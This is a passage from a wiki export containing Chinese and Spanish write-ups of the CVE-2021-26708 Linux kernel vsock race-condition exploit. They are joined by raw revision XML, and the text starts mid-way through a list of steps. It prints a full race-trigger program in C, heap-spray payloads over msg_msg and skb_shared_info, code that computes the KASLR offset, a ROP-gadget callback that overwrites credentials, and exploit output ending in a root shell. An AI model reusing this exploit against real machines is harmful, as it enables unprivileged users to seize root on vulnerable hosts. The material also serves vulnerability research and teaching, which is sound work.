調用msgsnd()來建立一個單獨的消息隊列；在內存破壞後，msg_msg對像被放置在virtio_vsock_sock位置;
解析內核日誌，從內核警告（RCX寄存器）中保存msg_msg的內核地址;
同時，從RBX寄存器中保存vsock_sock的內核地址;
使用損壞的 msg_msg對原始msg_msg執行任意釋放:
使用原始 msg_msg地址的4個字節作為 SO_VM_SOCKETS_BUFFER_SIZE，用於實現內存破壞；
在虛擬套接字上進行條件競爭；
在第二個connect()之後馬上調用msgsnd()；msg_msg被放置在virtio_vsock_sock的位置，實現破壞；
現在被破壞的msg_msg的security指針存儲原始msg_msg的地址(來自步驟2)；
&lt;/div&gt;

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
如果在處理 msgsnd() 的過程中發生了來自 setsockopt()線程的 msg_msg.security內存損壞，進而SELinux權限檢查失敗；
在這種情況下，msgsnd()返回-1，損壞的msg_msg被銷毀；釋放msg_msg.security可以釋放原始msg_msg；
用一個可控的payload 覆蓋原始msg_msg：
msgsnd()失敗後，漏洞就會調用pthread_barrier_wait()，調用127個用於堆噴射的pthreads；
這些pthreads執行setxattr()的payload；
原始msg_msg被可控的數據覆蓋，msg_msg.next指針存儲vsock_sock對象的地址；
&lt;/div&gt;

[[File:T0140baae964febb059.png | 600px ]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
通過從存儲被覆蓋的 msg_msg的消息隊列中接收消息，將vsock_sock內核對象的內容讀到用戶空間：
&lt;/div&gt;
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==尋找攻擊目標==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
以下是我找到的點：
1.專用的塊緩存，如PINGv6和sock_inode_cache有很多指向對象的指針
2.struct mem_cgroup *sk_memcg指針在vsock_sock.sk偏移量664處。 mem_cgroup結構是在kmalloc-4k塊緩存中分配的。
3.const struct cred *owner指針在vsock_sock.sk偏移量840處，存儲了可以覆蓋進行權限升級的憑證的地址。
4.void (*sk_write_space)(struct sock *)函數指針在vsock_sock.sk偏移量688處，被設置為sock_def_write_space()內核函數的地址。它可以用來計算KASLR偏移量。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
下面是該漏洞如何從內存中提取這些指針:
&lt;/div&gt;

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==在 sk_buff 上實現 Use-after-free==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
Linux內核中與網絡相關的緩衝區用struct sk_buff表示，這個對像中有skb_shared_info與destructor_arg，可以用於控制流劫持。網絡數據和skb_shared_info被放置在由sk_buff.head指向的同一個內核內存塊中。因此，在用戶空間中創建一個2800字節的網絡數據包會使skb_shared_info被分配到kmalloc-4k塊緩存中，mem_cgroup對像也是如此。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
我構建了以下步驟：
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
1.使用socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)創建一個客戶端套接字和32個服務器套接字
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
2.在用戶空間中準備一個2800字節的緩衝區，並用0x42對其memset()
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
3.用sendto()將這個緩衝區從客戶端套接字發送到每個服務器套接字，用於在kmalloc-4k中創建sk_buff對象。在每個可用的CPU上使用`sched_setaffinity()
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
4.對vsock_sock執行任意讀取過程
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
5.計算可能的sk_buff內核地址為sk_memcg加4096(kmalloc-4k的下一個元素)
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
6.對這個可能的sk_buff地址執行任意讀
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
7.如果在網絡數據的位置找到0x42424242424242lu，則找到真正的sk_buff，進入步驟8。否則，在可能的sk_buff地址上加4096，轉到步驟6
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
8.sk_buff上執行32個pthreads的setxattr()&amp;userfaultfd()堆噴射，並把它們掛在pthread_barrier上
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
9.對sk_buff內核地址進行任意釋放
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
10.調用pthread_barrier_wait()，執行32個setxattr()覆蓋skb_shared_info的堆噴pthreads
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
11.使用recv()接收服務器套接字的網絡消息。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==通過skb_shared_info 進行任意寫==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
以下是覆蓋sk_buff對象的有效payload：
&lt;/div&gt;

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
skb_shared_info駐留在噴射數據中，正好在偏移量SKB_SHINFO_OFFSET處，即3776字節。 skb_shared_info.destructor_arg指針存儲了struct ubuf_info的地址。因為被攻擊的sk_buff的內核地址是已知的，所以能在網絡緩衝區的MY_UINFO_OFFSET處創建了一個假的ubuf_info。下面是有效payload的佈局：
&lt;/div&gt;

[[File:T0185ccbf9f025c74da.png  | 600px]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
下面講講destructor_arg 回調:
&lt;/div&gt;
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
由於在vmlinuz-5.10.11-200.fc33.x86_64中找不到一個能滿足我需求的gadget，所以我自己進行了研究構造。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
callback函數指針存儲一個ROP gadget 地址，RDI存儲callback函數的第一個參數，也就是ubuf_info本身的地址，RDI + 8指向ubuf_info.desc。 gadget 將ubuf_info.desc移動到RDX。現在RDX包含有效用戶ID和組ID的地址減一個字節。這個字節很重要：當gadget從 RSI向 RDX指向的內存中寫入消息1時，有效的 uid和 gid將被零覆蓋。重複同樣的過程，直到權限升級到root。整個過程輸出流如下：
&lt;/div&gt;
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==視頻==
&lt;/div&gt;
&lt;youtube&gt;https://www.youtube.com/watch?v=EC8PFOYOUgU&lt;/youtube&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==參考==
&lt;/div&gt;
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>ngjfj9jcawrm8vir9k3s8ytm0aedl9t</sha1>
    </revision>
    <revision>
      <id>2316</id>
      <parentid>2314</parentid>
      <timestamp>2021-05-05T05:47:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "En el primer paso, comencé a estudiar la pulverización de pila estable, que explotaba la ejecución de las actividades del espacio del usuario para hacer que el kernel asign..."</comment>
      <origin>2316</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="27169" sha1="b3eedc47wme73o9ec2rophrpg6obkx9" xml:space="preserve">&lt;languages  /&gt;
Vulnerabilidad

Estas vulnerabilidades son causadas por la contención condicional provocada por un falso bloqueo en &lt;code&gt;net/vmw_vsock/af_vsock.c&lt;/code&gt;. Estas contenciones de condiciones se introdujeron implícitamente en el commit de noviembre de 2019 que añadió el soporte de multitransferencia VSOCK y se fusionaron en la versión 5.5-rc1 del kernel de Linux.

&lt;code&gt;CONFIG_VSOCKETS&lt;/code&gt; y &lt;code&gt;CONFIG_VIRTIO_VSOCKETS&lt;/code&gt; se proporcionan como módulos del núcleo en todas las principales distribuciones de GNU/Linux. Estos módulos vulnerables se cargan automáticamente cuando se crea un socket para el dominio AF_VSOCK.
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

La creación de sockets &lt;code&gt;AF_VSOCK&lt;/code&gt; está disponible para los usuarios sin privilegios y no requiere espacio de nombre de usuario.


Corrupción de la memoria

A continuación se detalla la explotación de la CVE-2021-26708, que hace uso de la competencia condicional en &lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;, la recuperación requiere dos hilos, el primero de los cuales llama a &lt;code&gt;setsockopt()&lt;/code&gt;.
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



El segundo hilo cambia el transporte del socket virtual cuando &lt;código&gt;vsock_stream_etssockopt()&lt;/código&gt; intenta obtener un bloqueo de socket, lo que se consigue reconectando el socket virtual a.
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


Para manejar &lt;code&gt;connect()&lt;/code&gt; para sockets virtuales, el kernel ejecuta &lt;code&gt;vsock_stream_connect()&lt;/code&gt; que llama a &lt;code&gt;vsock_assign_transport()&lt;/code&gt;. Esta función contiene el siguiente código.
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;código&gt;vsock_stream_connect()&lt;/código&gt; contiene el bloqueo del socket, y &lt;código&gt;vsock_stream_setsockopt()&lt;/código&gt; en el hilo paralelo también intenta obtenerlo, constituyendo una competencia condicional. Como resultado, la función &lt;code&gt;vsock_deassign_transport()&lt;/code&gt; es llamada cuando se realiza una segunda &lt;code&gt;connect()&lt;/code&gt; con un &lt;code&gt;svm_cid&lt;/code&gt; diferente. La función ejecuta &lt;code&gt;virtio_transport_destruct()&lt;/code&gt;, liberando &lt;code&gt;vsock_sock.trans&lt;/code&gt;, y &lt;code&gt;vsk-&gt;transport&lt;/code&gt; se establece en NULL. cuando &lt;code&gt;vsock_ stream_connect()&lt;/code&gt; libera el bloqueo del socket, &lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt; puede seguir ejecutándose. Llama a &lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;, seguido de &lt;code&gt;transport-&gt;notify_buffer_size()&lt;/code&gt;. Aquí el transporte contiene un valor obsoleto de una variable local que no coincide con &lt;code&gt;vsk-&gt;transport&lt;/code&gt; (la causa se establece en NULL).

El núcleo ejecuta &lt;código&gt;virtio_transport_notify_buffer_size()&lt;/código&gt; con corrupción de memoria.
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

Aquí, el vvs es un puntero a la memoria del núcleo, que ha sido liberado en &lt;code&gt;virtio_transport_destruct()&lt;/code&gt;. La &lt;code&gt;estructura virtio_vsock_sock&lt;/code&gt; tiene un tamaño de 64 bytes y se encuentra en la caché de bloques kmalloc-64. El tipo de campo buf_alloc es u32, ubicado en el offset 40. &lt;code&gt;VIRTIO_VSOCK_MAX_BUF_SIZE es 0xFFFFFFUL&lt;/code&gt;. El valor de *val es controlado por el atacante, y sus cuatro bytes menos significativos se escriben en la memoria liberada.


Prueba difusa

El fuzzer syzkaller no tiene forma de reproducir este bloqueo, así que decidí estudiarlo yo mismo. Pero, ¿por qué falla el fuzzer? Observe &lt;code&gt; vsock_update_buffer_size () &lt;/code&gt; y descubra:
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

Solo cuando val sea diferente del actual buffer_size, se llamará a &lt;code&gt; notify_buffer_size () &lt;/code&gt;, es decir, cuando &lt;code&gt; setsockopt () &lt;/code&gt; ejecute &lt;code&gt; SO_VM_SOCKETS_BUFFER_SIZE &lt;/code&gt;, cada vez Los parámetros de tamaño de la llamada deben ser todos diferentes. Entonces construí el código relevante:
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
&lt;/pre&gt;

El valor de tamaño aquí se toma del número de nanosegundos devueltos por &lt;code&gt; clock_gettime () &lt;/code&gt;, que puede ser diferente cada vez. El syzkaller original no hace esto, porque cuando syzkaller genera una entrada fuzzing, el valor del parámetro syscall está determinado y no cambiará durante la ejecución.

== El poder de cuatro bytes ==

Aquí elijo Fedora 33 Server como el objetivo de la investigación, la versión del kernel es 5.10.11-200.fc33.x86_64, y estoy decidido a omitir SMEP y SMAP.

En el primer paso, comencé a estudiar la pulverización de pila estable, que explotaba la ejecución de las actividades del espacio del usuario para hacer que el kernel asignara otro objeto de 64 bytes en la ubicación del virtio_vsock_sock liberado. Después de varios intentos experimentales, se confirmó que el virtio_vsock_sock publicado se sobrescribió, lo que indica que la fumigación en pilas es factible. Finalmente encontré msgsnd () syscall. Crea struct msg_msg en el espacio del kernel, vea la salida de pahole:
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

El anverso es el encabezado del mensaje y el reverso son los datos del mensaje. Si la estructura msgbuf en el espacio de usuario tiene un mtext de 16 bytes, se creará el correspondiente msg_msg en la caché del bloque kmalloc-64. Una escritura libre de 4 bytes destruirá el puntero de seguridad void * en el desplazamiento 40. El campo msg_msg.security apunta a los datos del kernel asignados por lsm_msg_msg_alloc (). Cuando se reciba msg_msg, será liberado por security_msg_msg_free (). Por lo tanto, al destruir la primera mitad del puntero de seguridad, se puede obtener una libertad arbitraria.

== Fuga de información del kernel ==

Aquí se utiliza [https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D % 87% E6% BC% 8F% E6% B4% 9E CVE-2019-18683] la misma técnica. El segundo connect () del socket virtual llama a &lt;code&gt; vsock_deassign_transport () &lt;/code&gt; y establece &lt;code&gt; vsk-&gt; transport &lt;/code&gt; en NULL, haciendo que &lt;code&gt; vsock_stream_setsockopt () &lt;/code&gt; Calling &lt;code &gt; virtio_transport_send_pkt_info () &lt;/code&gt; después de la caída de la memoria, aparece una advertencia del kernel:
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
A través de la depuración de gdb, se encuentra que el registro RCX contiene la dirección del kernel del virtio_vsock_sock liberado, y el registro RBX contiene la dirección del kernel de vsock_sock.

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==實現任意讀==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
===從 arbitrary free 到 use-after-free===
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
從洩露的內核地址釋放一個對象
執行堆噴，用受控數據覆蓋該對象
使用損壞的對象進行權限升級
內核實現的System V消息有限制最大值DATALEN_MSG，即PAGE_SIZE減去sizeof(struct msg_msg))。如果你發送了更大的消息，剩餘的消息會被保存在消息段的列表中。 msg_msg中包含struct msg_msgseg *next用於指向第一個段，size_t m_ts用於存儲大小。當進行覆蓋操作時，就可以把受控的值放在msg_msg.m_ts和msg_msg.next中：
&lt;/div&gt;

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
但是如何使用msg_msg讀取內核數據呢？通過閱讀msgrcv()系統調用文檔，我找到了好解決方案，使用msgrcv()和MSG標誌：
&lt;/div&gt;
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這個標誌使內核將消息數據複製到用戶空間，不從消息隊列中刪除。如果內核有CONFIG_CHECKPOINT_RESTORE=y，則MSG是可用的，在Fedora Server適用。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
===任意讀的步驟===
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
準備工作：
使用sched_getaffinity()和CPU_COUNT()計算可用的CPU數量（該漏洞至少需要兩個）;
打開/dev/kmsg進行解析;
